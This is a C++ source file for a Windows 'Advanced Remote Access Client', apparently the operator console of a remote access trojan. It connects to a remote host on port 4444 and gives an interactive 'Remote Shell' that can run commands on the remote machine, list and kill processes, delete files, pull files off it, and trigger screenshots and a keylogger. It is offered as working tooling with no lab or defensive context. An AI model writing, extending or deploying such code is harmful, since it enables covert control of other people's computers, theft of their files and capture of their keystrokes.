#include <iostream>
#include <winsock2.h>
#include <ws2tcpip.h>
#include <string>
#include <thread>
#include <windows.h>
#include <fstream>
#include <sstream>
#include <vector>

#pragma comment(lib, "ws2_32.lib")

class AdvancedRemoteAccessClient {
private:
    SOCKET clientSocket;
    struct sockaddr_in serverAddr;
    bool isConnected;
    std::string downloadDir;
    
public:
    AdvancedRemoteAccessClient() : isConnected(false), downloadDir("downloads") {
        WSAStartup(MAKEWORD(2, 2), &wsaData);
        CreateDirectoryA(downloadDir.c_str(), NULL); // Create downloads directory
    }
    
    ~AdvancedRemoteAccessClient() {
        cleanup();
        WSACleanup();
    }
    
    bool connectToServer(const std::string& serverIP, int port) {
        clientSocket = socket(AF_INET, SOCK_STREAM, 0);
        if (clientSocket == INVALID_SOCKET) {
            std::cerr << "Socket creation failed" << std::endl;
            return false;
        }
        
        // Set socket timeout
        DWORD timeout = 10000; // 10 seconds
        setsockopt(clientSocket, SOL_SOCKET, SO_RCVTIMEO, (char*)&timeout, sizeof(timeout));
        setsockopt(clientSocket, SOL_SOCKET, SO_SNDTIMEO, (char*)&timeout, sizeof(timeout));
        
        serverAddr.sin_family = AF_INET;
        serverAddr.sin_port = htons(port);
        
        if (inet_pton(AF_INET, serverIP.c_str(), &serverAddr.sin_addr) <= 0) {
            std::cerr << "Invalid address" << std::endl;
            return false;
        }
        
        if (connect(clientSocket, (struct sockaddr*)&serverAddr, sizeof(serverAddr)) == SOCKET_ERROR) {
            std::cerr << "Connection failed" << std::endl;
            return false;
        }
        
        isConnected = true;
        std::cout << "Connected to server " << serverIP << ":" << port << std::endl;
        return true;
    }
    
    void startInteractiveSession() {
        if (!isConnected) {
            std::cerr << "Not connected to server" << std::endl;
            return;
        }
        
        std::string command;
        
        std::cout << "\n=== Advanced Remote Access Client ===" << std::endl;
        std::cout << "Available commands:" << std::endl;
        std::cout << "  Basic: dir, cd, pwd, type, del, copy, etc." << std::endl;
        std::cout << "  System: sysinfo, processes, kill <pid>" << std::endl;
        std::cout << "  Files: download <file>, upload <file>" << std::endl;
        std::cout << "  Special: screenshot, keylog start/stop/dump" << std::endl;
        std::cout << "  Control: exit, help" << std::endl;
        std::cout << "=====================================\n" << std::endl;
        
        std::cout << "Remote Shell> ";
        
        while (std::getline(std::cin, command)) {
            if (command.empty()) {
                std::cout << "Remote Shell> ";
                continue;
            }
            
            if (command == "help") {
                showHelp();
                std::cout << "Remote Shell> ";
                continue;
            }
            
            if (command == "clear" || command == "cls") {
                system("cls");
                std::cout << "Remote Shell> ";
                continue;
            }
            
            // Handle local upload command
            if (command.substr(0, 7) == "upload ") {
                handleUpload(command.substr(7));
                std::cout << "Remote Shell> ";
                continue;
            }
            
            // Send command to server
            if (!sendCommand(command)) {
                std::cerr << "Failed to send command" << std::endl;
                break;
            }
            
            if (command == "exit") {
                break;
            }
            
            // Handle special responses
            if (command.substr(0, 9) == "download ") {
                handleDownload(command.substr(9));
            } else {
                // Receive and display normal response
                std::string response = receiveResponse();
                if (response.empty()) {
                    std::cerr << "Connection lost" << std::endl;
                    break;
                }
                std::cout << response;
                
                if (!response.empty() && response.back() != '\n') {
                    std::cout << std::endl;
                }
            }
            
            std::cout << "Remote Shell> ";
        }
    }
    
    void showHelp() {
        std::cout << "\n=== Command Help ===" << std::endl;
        std::cout << "Basic Commands:" << std::endl;
        std::cout << "  dir, ls          - List directory contents" << std::endl;
        std::cout << "  cd <path>        - Change directory" << std::endl;
        std::cout << "  pwd              - Show current directory" << std::endl;
        std::cout << "  type <file>      - Display file contents" << std::endl;
        std::cout << "  del <file>       - Delete file" << std::endl;
        std::cout << "\nSystem Commands:" << std::endl;
        std::cout << "  sysinfo          - Show system information" << std::endl;
        std::cout << "  processes        - List running processes" << std::endl;
        std::cout << "  kill <pid>       - Terminate process by PID" << std::endl;
        std::cout << "\nFile Operations:" << std::endl;
        std::cout << "  download <file>  - Download file from server" << std::endl;
        std::cout << "  upload <file>    - Upload local file to server" << std::endl;
        std::cout << "\nSpecial Commands:" << std::endl;
        std::cout << "  screenshot       - Take screenshot (if supported)" << std::endl;
        std::cout << "  keylog start     - Start keylogger (if supported)" << std::endl;
        std::cout << "  keylog stop      - Stop keylogger" << std::endl;
        std::cout << "  keylog dump      - Get keylog data" << std::endl;
        std::cout << "\nClient Commands:" << std::endl;
        std::cout << "  help             - Show this help" << std::endl;
        std::cout << "  clear, cls       - Clear screen" << std::endl;
        std::cout << "  exit             - Disconnect and exit" << std::endl;
        std::cout << "==================\n" << std::endl;
    }
    
    bool sendCommand(const std::string& command) {
        if (!isConnected) {
            return false;
        }
        
        if (send(clientSocket, command.c_str(), command.length(), 0) == SOCKET_ERROR) {
            return false;
        }
        
        return true;
    }
    
    std::string receiveResponse() {
        if (!isConnected) {
            return "";
        }
        
        char buffer[8192];
        int bytesReceived = recv(clientSocket, buffer, sizeof(buffer) - 1, 0);
        
        if (bytesReceived <= 0) {
            return "";
        }
        
        buffer[bytesReceived] = '\0';
        return std::string(buffer);
    }
    
    void handleDownload(const std::string& filename) {
        std::string response = receiveResponse();
        
        if (response.substr(0, 6) == "ERROR:") {
            std::cout << response;
            return;
        }
        
        if (response.substr(0, 11) == "FILE_START:") {
            // Parse file download response
            std::istringstream iss(response);
            std::string line;
            std::string receivedFilename;
            size_t fileSize = 0;
            std::string fileContent;
            
            // Parse header
            std::getline(iss, line); // FILE_START line
            receivedFilename = line.substr(11);
            
            std::getline(iss, line); // SIZE line
            if (line.substr(0, 5) == "SIZE:") {
                fileSize = std::stoul(line.substr(5));
            }
            
            // Read file content
            std::string remainingContent;
            while (std::getline(iss, line)) {
                if (line == "FILE_END") {
                    break;
                }
                if (!remainingContent.empty()) {
                    remainingContent += "\n";
                }
                remainingContent += line;
            }
            
            // Save file
            std::string localPath = downloadDir + "\\" + extractFilename(receivedFilename);
            std::ofstream outFile(localPath, std::ios::binary);
            if (outFile.is_open()) {
                outFile.write(remainingContent.c_str(), remainingContent.size());
                outFile.close();
                std::cout << "File downloaded: " << localPath << " (" << remainingContent.size() << " bytes)" << std::endl;
            } else {
                std::cout << "Failed to save file: " << localPath << std::endl;
            }
        } else {
            std::cout << response;
        }
    }
    
    void handleUpload(const std::string& filename) {
        std::ifstream file(filename, std::ios::binary);
        if (!file.is_open()) {
            std::cout << "Cannot open local file: " << filename << std::endl;
            return;
        }
        
        std::stringstream buffer;
        buffer << file.rdbuf();
        file.close();
        
        std::string fileContent = buffer.str();
        std::string remoteFilename = extractFilename(filename);
        
        std::string uploadCommand = "upload " + remoteFilename + ":" + fileContent;
        
        if (sendCommand(uploadCommand)) {
            std::string response = receiveResponse();
            std::cout << response;
        } else {
            std::cout << "Failed to upload file" << std::endl;
        }
    }
    
    std::string extractFilename(const std::string& path) {
        size_t lastSlash = path.find_last_of("\\/");
        if (lastSlash != std::string::npos) {
            return path.substr(lastSlash + 1);
        }
        return path;
    }
    
    void cleanup() {
        isConnected = false;
        if (clientSocket != INVALID_SOCKET) {
            closesocket(clientSocket);
        }
    }
    
private:
    WSADATA wsaData;
};

int main(int argc, char* argv[]) {
    std::string serverIP = "127.0.0.1"; // Default to localhost
    int port = 4444; // Default port
    
    // Parse command line arguments
    if (argc >= 2) {
        serverIP = argv[1];
    }
    if (argc >= 3) {
        port = std::stoi(argv[2]);
    }
    
    AdvancedRemoteAccessClient client;
    
    std::cout << "Advanced Remote Access Client v2.0" << std::endl;
    std::cout << "Attempting to connect to " << serverIP << ":" << port << std::endl;
    
    if (!client.connectToServer(serverIP, port)) {
        std::cerr << "Failed to connect to server" << std::endl;
        std::cout << "Press any key to exit...";
        std::cin.get();
        return 1;
    }
    
    client.startInteractiveSession();
    
    std::cout << "Connection closed" << std::endl;
    return 0;
}